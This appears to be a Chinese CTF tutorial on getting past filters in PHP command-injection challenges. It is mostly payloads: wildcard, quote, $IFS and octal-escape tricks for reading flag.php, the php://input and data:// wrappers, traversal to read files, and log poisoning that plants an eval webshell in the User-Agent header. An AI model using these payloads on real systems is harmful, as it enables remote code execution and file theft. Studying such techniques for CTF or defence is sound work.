<h1 id="三-文件名过滤"><a href="#三-文件名过滤" class="headerlink" title="三. 文件名过滤"></a>三. 文件名过滤</h1><h2 id="3-1-​通配符绕过"><a href="#3-1-​通配符绕过" class="headerlink" title="3.1 *​通配符绕过"></a>3.1 <code>*</code>​通配符绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl*g.php&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac fl*&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="3-2-​空字符匹配绕过"><a href="#3-2-​空字符匹配绕过" class="headerlink" title="3.2 &#39;&#39;​空字符匹配绕过"></a>3.2 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fla&#x27;&#x27;g.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>空字符串</strong>的可以用于绕过某些字符过滤，<code>fla&#39;&#39;g.php</code>​ 等价于 <code>flag.php</code>​</p>
<h2 id="3-3-​匹配绕过"><a href="#3-3-​匹配绕过" class="headerlink" title="3.3 \​匹配绕过"></a>3.3 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac fl\ag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>fl\ag.php</code>​ 可能会被解释为 <code>flag.php</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
<h2 id="3-4-​占位绕过"><a href="#3-4-​占位绕过" class="headerlink" title="3.4 ?​占位绕过"></a>3.4 <code>?</code>​占位绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac f???????&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在很多操作系统的文件系统中，<code>?</code>​ 被用作通配符，代表 <strong>任何单个字符</strong>。在 Linux 中，<code>f???????</code>​ 可以匹配任何以 <code>f</code>​ 开头并包含 7 个任意字符的文件名</p>
<h2 id="3-5-传参执行绕过"><a href="#3-5-传参执行绕过" class="headerlink" title="3.5 传参执行绕过"></a>3.5 传参执行绕过</h2><h3 id="3-5-1-eval函数"><a href="#3-5-1-eval函数" class="headerlink" title="3.5.1 eval函数"></a>3.5.1 eval函数</h3><p>eval函数执行任意php命令，这里利用get方式接受x参数，在传参中执行命令，而在这个get方式接受的参数并没有被过滤</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=eval($_GET[x]);&amp;x=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-5-2-include函数"><a href="#3-5-2-include函数" class="headerlink" title="3.5.2 include函数"></a>3.5.2 include函数</h3><p>这个方法实际上是结合了文件包含漏洞，利用文件包含读取flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>如果<code>(</code>​和<code>;</code>​被过滤：<br>​<code>%0a</code>​ 是 URL 编码中表示换行符（<code>\n</code>​）的字符。从而使得 <code>include</code>​ 语句和 <code>$_GET[1]</code>​ 的处理被分开，从而绕过过滤机制，不过include函数这里不加<code>(</code>​也是可以的<br>php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include%<span class="number">0</span>a$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="3-5-3-日志包含"><a href="#3-5-3-日志包含" class="headerlink" title="3.5.3 日志包含"></a>3.5.3 日志包含</h3><p>既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的UA头，假设我们在UA头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件，日志包含可以参考我过去的文章。这里的日志目录需要多次尝试。用蚁剑连接<code>http://576f2421-5308-45ef-9c2e-17454de9e09a.challenge.ctf.show/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log</code>​即可，注意要用<code>http</code>​，浏览器上直接粘下来会由于SSL证书连不上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[<span class="number">1</span>]?&gt;&amp;<span class="number">1</span>=../../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>  </span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-6-变量作用域劫持攻击"><a href="#3-6-变量作用域劫持攻击" class="headerlink" title="3.6 变量作用域劫持攻击"></a>3.6 变量作用域劫持攻击</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">post:</span><br><span class="line">	<span class="number">1</span>=system(<span class="string">&#x27;tac fl*&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-6-1-函数解释"><a href="#3-6-1-函数解释" class="headerlink" title="3.6.1 函数解释"></a>3.6.1 函数解释</h3><ul>
<li>​<strong>​<code>get_defined_vars()</code>​</strong> ​<br>获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值。</li>
<li>​<strong>​<code>next(get_defined_vars())</code>​</strong> ​<br>将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 <code>get_defined_vars()</code>​ 返回的数组。</li>
<li>​<strong>​<code>array_pop(...)</code>​</strong> ​<br>弹出数组的最后一个元素。这里作用在 <code>next(get_defined_vars())</code>​ 的结果上，获取这个数组的最后一个变量值。</li>
</ul>
<h3 id="3-6-2-攻击流程"><a href="#3-6-2-攻击流程" class="headerlink" title="3.6.2 攻击流程"></a>3.6.2 攻击流程</h3><ul>
<li>攻击者通过 <code>POST</code>​ 请求传入 <code>1=system(&#39;tac fl*&#39;);</code>​，在服务器端该数据被<strong>存储为变量</strong>。</li>
<li>​<code>array_pop(next(get_defined_vars()))</code>​ 获取该变量值，即 <code>system(&#39;tac fl*&#39;)</code>​。</li>
<li>​<code>eval()</code>​ 动态执行，触发 <code>system(&#39;tac fl*&#39;)</code>​，攻击者能够获取敏感文件内容。</li>
</ul>
<h2 id="3-7-函数嵌套文件枚举"><a href="#3-7-函数嵌套文件枚举" class="headerlink" title="3.7 函数嵌套文件枚举"></a>3.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h2 id="3-8-函数嵌套文件读取"><a href="#3-8-函数嵌套文件读取" class="headerlink" title="3.8 函数嵌套文件读取"></a>3.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">?c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>还可以用另一个函数得到目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="四-空格过滤"><a href="#四-空格过滤" class="headerlink" title="四. 空格过滤"></a>四. 空格过滤</h1><h2 id="4-1-20​空格绕过"><a href="#4-1-20​空格绕过" class="headerlink" title="4.1 %20​空格绕过"></a>4.1 <code>%20</code>​空格绕过</h2><p>是 URL 编码的空格</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%20flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-2-09​空格绕过"><a href="#4-2-09​空格绕过" class="headerlink" title="4.2 %09​空格绕过"></a>4.2 <code>%09</code>​空格绕过</h2><p>​<code>%09</code>​ 是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 <code>tac</code>​ 后面的 <code>fla*</code>​ 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac%09flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-3-IFS-9​空格绕过"><a href="#4-3-IFS-9​空格绕过" class="headerlink" title="4.3 $IFS$9​空格绕过"></a>4.3 <code>$IFS$9</code>​空格绕过</h2><p>​<code>$IFS</code>​ 是一个特殊的环境变量，表示 <strong>Internal Field Separator（内部字段分隔符）</strong> ，默认情况下，<code>$IFS</code>​ 的值包含空格、制表符和换行符。<code>$9</code>​是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$IFS$9flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="4-4-IFS-​绕过"><a href="#4-4-IFS-​绕过" class="headerlink" title="4.4 ${IFS}​绕过"></a>4.4 <code>$&#123;IFS&#125;</code>​绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac$&#123;IFS&#125;flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="4-5"><a href="#4-5" class="headerlink" title="4.5 &lt;​空格绕过"></a>4.5 <code>&lt;</code>​空格绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;tac&lt;fla*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​<code>&lt;</code>​ 是 <strong>输入重定向符号</strong>，用于将文件内容作为命令的输入，可以用于空格绕过。</p>
<h1 id="五-命令过滤"><a href="#五-命令过滤" class="headerlink" title="五. 命令过滤"></a>五. 命令过滤</h1><h2 id="5-1-​空字符匹配绕过"><a href="#5-1-​空字符匹配绕过" class="headerlink" title="5.1 &#39;&#39;​空字符匹配绕过"></a>5.1 <code>&#39;&#39;</code>​空字符匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta&#x27;&#x27;c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>和文件名绕过一样，<strong>空字符串</strong>的可以用于绕过某些函数的过滤，<code>ta&#39;&#39;c</code>​ 等价于 <code>tac</code>​</p>
<h2 id="5-2-​匹配绕过"><a href="#5-2-​匹配绕过" class="headerlink" title="5.2 \​匹配绕过"></a>5.2 <code>\</code>​匹配绕过</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ta\c flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>​<code>\</code>​ 是 **转义字符**，通常用于转义后面的字符，在某些情况下，<code>ta\c</code>​ 可能会被解释为 <code>tac</code>​，即通过插入转义字符来避免直接匹配敏感词或绕过过滤</p>
<h2 id="5-3-命令文件-​绕过"><a href="#5-3-命令文件-​绕过" class="headerlink" title="5.3 命令文件+?​绕过"></a>5.3 命令文件+<code>?</code>​绕过</h2><p>cat命令所在的路径是在&#x2F;bin&#x2F;目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面，如果bin被过滤了也可以用通配符<br>记得cat要看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/c?t flag.php</span><br><span class="line">?c=/?in/c?t flag.php</span><br></pre></td></tr></table></figure>

<p>同理，base64命令也可以这样操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ba?e64 flag.php</span><br></pre></td></tr></table></figure>

<h2 id="5-4-换用其他命令"><a href="#5-4-换用其他命令" class="headerlink" title="5.4 换用其他命令"></a>5.4 换用其他命令</h2><p>在第一部分有这么多函数，说不定有些没被过滤呢</p>
<h1 id="六-字母过滤"><a href="#六-字母过滤" class="headerlink" title="六. 字母过滤"></a>六. 字母过滤</h1><h2 id="6-1-base64命令文件执行"><a href="#6-1-base64命令文件执行" class="headerlink" title="6.1 base64命令文件执行"></a>6.1 base64命令文件执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br><span class="line">?c=/???/????<span class="number">64</span> ????.???</span><br></pre></td></tr></table></figure>

<h2 id="6-2-数字ASCII码代替字母"><a href="#6-2-数字ASCII码代替字母" class="headerlink" title="6.2 数字ASCII码代替字母"></a>6.2 数字ASCII码代替字母</h2><p>​<code>$&#39;</code>​ 是 Bash 中的字符转义机制，用于解析以反斜杠 <code>\</code>​ 开头的转义字符或八进制&#x2F;十六进制字符表示。其中，以<code>\143</code>​为例，<code>\143</code>​ 是 ASCII 八进制表示，转换为字符 <strong>​<code>c</code>​</strong>​。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=$<span class="string">&#x27;\154\163&#x27;</span>      ls</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\143\141\164&#x27;</span>%<span class="number">20</span>*     cat *</span><br><span class="line"></span><br><span class="line">?c=$<span class="string">&#x27;\164\141\143&#x27;</span> $<span class="string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span>      tac flag.php</span><br></pre></td></tr></table></figure>

<p>可以使用python脚本来实现八进制ASCII码的编码与解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_to_octal</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 将每个字符转换为其ASCII码的八进制表示</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> input_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">input_string = <span class="string">&quot;cat&quot;</span></span><br><span class="line">encoded_string = encode_to_octal(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded: <span class="subst">&#123;encoded_string&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_from_octal</span>(<span class="params">octal_string</span>):</span><br><span class="line">    <span class="comment"># 分割八进制字符串，并将每个八进制值转换为字符</span></span><br><span class="line">    characters = octal_string.split(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">1</span>:]  <span class="comment"># 去掉空字符串部分</span></span><br><span class="line">    decoded_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(c), <span class="number">8</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> characters)</span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">octal_string = <span class="string">&quot;\\143\\141\\164&quot;</span></span><br><span class="line">decoded_string = decode_from_octal(octal_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded: <span class="subst">&#123;decoded_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="七-命令执行函数过滤"><a href="#七-命令执行函数过滤" class="headerlink" title="七. 命令执行函数过滤"></a>七. 命令执行函数过滤</h1><p>题目只有一层<code>eval</code>​，而用于执行命令的函数都被过滤了，下面将介绍如何<strong>仅仅通过函数的结合，不利用任何命令</strong>，来实现目录与文件读取</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;        </span><br><span class="line">	$c= $_POST[<span class="string">&#x27;c&#x27;</span>];           </span><br><span class="line">	eval($c);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	highlight_file(__FILE__);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-1-函数嵌套目录读取"><a href="#7-1-函数嵌套目录读取" class="headerlink" title="7.1 函数嵌套目录读取"></a>7.1 函数嵌套目录读取</h2><h3 id="7-1-1-自根目录向下读取目录"><a href="#7-1-1-自根目录向下读取目录" class="headerlink" title="7.1.1 自根目录向下读取目录"></a>7.1.1 自根目录向下读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www&quot;</span>));</span><br><span class="line">c=print_r(scandir(<span class="string">&quot;/var/www/html&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>这里也一样，不再列举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(<span class="string">&quot;/&quot;</span>)));</span><br><span class="line">c=echo json_encode(scandir(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure>

<h3 id="7-1-2-自当前目录向上读取目录"><a href="#7-1-2-自当前目录向上读取目录" class="headerlink" title="7.1.2 自当前目录向上读取目录"></a>7.1.2 自当前目录向上读取目录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));  <span class="comment">// 读取当前目录</span></span><br><span class="line">c=print_r(scandir(dirname(__DIR__)));   <span class="comment">// 读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__FILE__))));<span class="comment">//读取上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(__DIR__))));<span class="comment">//读取上上级目录</span></span><br><span class="line">c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>​<code>dirname()</code>​ 用于获取路径的目录部分。<code>dirname(&#39;FILE&#39;);</code>​返回 ‘.’</li>
<li>​<code>scandir()</code>​ 列出指定目录中的文件和目录，返回一个数组</li>
<li>​<code>print_r()</code>​ 输出变量的易读信息，适合用于调试和查看数组内容</li>
<li>​<code>__FILE__</code>​ <code>__DIR__</code>​是php中的魔术方法，可以用于获取当前目录与上级目录，通过迭代<code>dirname</code>​函数就能实现目录遍历<br>输出：<code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</code>​<br>这里也一样，不再列举</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=var_export(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br><span class="line">c=echo(implode(<span class="string">&#x27;--&#x27;</span>,scandir(dirname(dirname(dirname(dirname(__DIR__)))))));</span><br><span class="line">c=echo json_encode(scandir(dirname(dirname(dirname(dirname(__DIR__))))));</span><br></pre></td></tr></table></figure>

<p>还可以用glob函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../*&#x27;</span>));</span><br><span class="line">c=var_export(glob(<span class="string">&#x27;../../../*&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h2 id="7-2-include函数文件读取"><a href="#7-2-include函数文件读取" class="headerlink" title="7.2 include函数文件读取"></a>7.2 include函数文件读取</h2><h3 id="7-2-1-直接包含输出文件"><a href="#7-2-1-直接包含输出文件" class="headerlink" title="7.2.1 直接包含输出文件"></a>7.2.1 直接包含输出文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=include(<span class="string">&quot;flag.php&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;../../../../../flag.txt&quot;</span>);echo $flag;</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);echo $flag;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-2-伪协议文件读取❓"><a href="#7-2-2-伪协议文件读取❓" class="headerlink" title="7.2.2 伪协议文件读取❓"></a>7.2.2 伪协议文件读取❓</h3><ol>
<li>​<code>php://filter</code>​伪协议，它的传参伪协议打法更详细见[[#3.5.2 include函数]]</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=../../../../../flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">c=include <span class="string">&quot;php://filter/convert.iconv.UTF8.UTF16/resource=/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">?c=include($_GET[x]);&amp;x=php:<span class="comment">//filter/convert.iconv.UTF8.UTF16/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>​<code>php://input</code>​伪协议</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=php:<span class="comment">//input</span></span><br><span class="line">post：&lt;?php system(<span class="string">&quot;ls -lah&quot;</span>)?&gt;</span><br><span class="line">      &lt;?php system(<span class="string">&quot;tac flag.php&quot;</span>)?&gt;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>​<code>data://</code>​伪协议<br> 第二个是对php代码base64编码绕过<code>flag.php</code>​的过滤❓</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br><span class="line">c=include$_GET[x]&amp;x=data:<span class="comment">//text/plain;base64,data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,&lt;?=system(&quot;ls&quot;)?&gt;      //短标签绕过php过滤</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-3-日志包含"><a href="#7-2-3-日志包含" class="headerlink" title="7.2.3 日志包含"></a>7.2.3 日志包含</h3><p>日志的相对位置需要去遍历目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include(../../../var/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>)</span><br><span class="line">UA:&lt;?php eval($_POST[<span class="string">&#x27;x&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-3-针对文件包含的过滤"><a href="#7-2-3-针对文件包含的过滤" class="headerlink" title="7.2.3 针对文件包含的过滤"></a>7.2.3 针对文件包含的过滤</h3><p>传参伪协议</p>
<h2 id="7-3-highlight函数文件读取"><a href="#7-3-highlight函数文件读取" class="headerlink" title="7.3 highlight函数文件读取"></a>7.3 highlight函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//访问当前目录下的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">//通过相对路径访问上级目录的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"><span class="comment">//自根目录访问下级目录中的flag</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="7-4-show-source函数文件读取"><a href="#7-4-show-source函数文件读取" class="headerlink" title="7.4 show_source函数文件读取"></a>7.4 show_source函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=show_source(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

